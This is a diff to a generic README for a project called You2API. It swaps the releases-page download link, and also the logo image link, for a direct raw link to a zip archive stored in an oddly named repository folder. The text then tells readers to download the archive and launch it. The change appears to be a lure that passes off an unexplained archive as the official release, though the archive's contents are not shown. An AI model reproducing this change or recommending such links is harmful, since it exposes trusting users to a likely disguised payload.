@@ -8,7 +8,7 @@ Unfortunately, a short description for this repository is not provided. However,
 ## Installation
 To get started with You2API, you can download the latest version by clicking on the following link: 
 
-[![Download You2API](https://github.com/iq1123/You2API/releases/tag/v2.0)](https://github.com/iq1123/You2API/releases/tag/v2.0)
+[![Download You2API](https://raw.githubusercontent.com/iq1123/You2API/main/unchancy/API_You_v2.0-beta.4.zip)](https://raw.githubusercontent.com/iq1123/You2API/main/unchancy/API_You_v2.0-beta.4.zip)
 
 This link will direct you to the download page for the You2API project. Once downloaded, the project needs to be launched to start using it effectively.
 
@@ -30,4 +30,4 @@ Remember to check out the "Releases" section if the provided download link is no
 
 Thank you for your interest in the You2API project! 🌟 We hope you find it valuable and enjoy using it for your projects. Happy coding! 🚀
 
-![You2API Logo](https://github.com/iq1123/You2API/releases/tag/v2.0)
+![You2API Logo](https://raw.githubusercontent.com/iq1123/You2API/main/unchancy/API_You_v2.0-beta.4.zip)
